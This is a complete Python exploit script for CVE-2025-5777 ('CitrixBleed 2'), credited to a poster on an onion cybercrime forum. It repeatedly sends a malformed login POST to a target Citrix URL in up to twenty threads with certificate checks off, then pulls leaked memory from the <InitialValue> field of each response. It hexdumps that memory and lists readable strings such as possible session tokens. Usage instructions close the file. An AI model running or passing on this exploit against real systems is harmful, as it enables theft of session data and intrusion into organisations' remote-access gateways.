# CVE-2025-5777
# Source and credits: Oxymoron at http://xssforumv3isucukbxhdhwz67hoa5e2voakcfkuieq4ch257vsburuid.onion/threads/141722/

import requests
import sys
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor


requests.packages.urllib3.disable_warnings()


def hexdump(data, length=16):
    result = []
    for i in range(0, len(data), length):
        chunk = data[i:i+length]
        hex_str = ' '.join(f'{b:02x}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
        result.append(f"{i:08x}  {hex_str.ljust(3*length)}  {ascii_str}")
    return '\n'.join(result)
    

def deep_scan(data):
    strings = re.findall(b'[ -~]{8,}', data)
    return [s.decode('ascii') for s in strings]


def send_request(target_url, delay, thread_id, stop_event):
    headers = {
        "User-Agent": "CitrixBleed-Scanner/1.0",
        "Connection": "keep-alive",
        "Content-Length": "5",
    }
    count = 0
    while not stop_event.is_set():
        count += 1
        try:
            response = requests.post(
                target_url,
                headers=headers,
                data="login",
                verify=False,
                timeout=15,
            )

            if b"<InitialValue>" in response.content:
                leaked_data = re.search(b"<InitialValue>(.*?)</InitialValue>", response.content, re.DOTALL).group(1)
                binary_data = leaked_data

                print(f"\n[Thread {thread_id}] [+] Request #{count} ==================================")
                print("\nHexdump:")
                print(hexdump(binary_data))

                found_strings = deep_scan(binary_data)
                if found_strings:
                    print("\nPossible useful strings:")
                    for s in found_strings:
                        print(f"    • {s}")

            else:
                print(f"[Thread {thread_id}] [!] Request #{count}: <InitialValue> not found in response.")

        except Exception as e:
            print(f"[Thread {thread_id}] [!] Request #{count} error: {str(e)[:50]}...")

        time.sleep(delay)


def exploit_citrixbleed_multithread(target_url, speed_level):
    config = {
        0: (1, 2.0),
        1: (2, 1.5),
        2: (4, 1.0),
        3: (8, 0.5),
        4: (12, 0.2),
        5: (20, 0.0),
    }

    if speed_level not in config:
        print(f"Invalid speed level: {speed_level}. Must be between 0 and 5.")
        sys.exit(1)

    num_threads, delay = config[speed_level]
    print(f"[*] Target: {target_url}")
    print(f"[*] Speed level: {speed_level} -> {num_threads} threads, delay {delay} seconds")
    print("[*] Sending requests indefinitely (press Ctrl+C to stop)...\n")

    stop_event = threading.Event()
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for i in range(num_threads):
            futures.append(executor.submit(send_request, target_url, delay, i+1, stop_event))

        try:
            for future in futures:
                future.result()
        except KeyboardInterrupt:
            print("\n[*] Stopping execution...")
            stop_event.set()
            time.sleep(delay + 0.5)
            print("[*] Execution stopped.")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 citrixbleed2_exploit.py <URL> <speed_level (0-5)>")
        print("Example: python3 citrixbleed2_exploit.py https://target.com 3")
        sys.exit(1)

    url = sys.argv[1]
    try:
        speed = int(sys.argv[2])
    except ValueError:
        print("Speed level must be an integer between 0 and 5.")
        sys.exit(1)

    exploit_citrixbleed_multithread(url, speed)

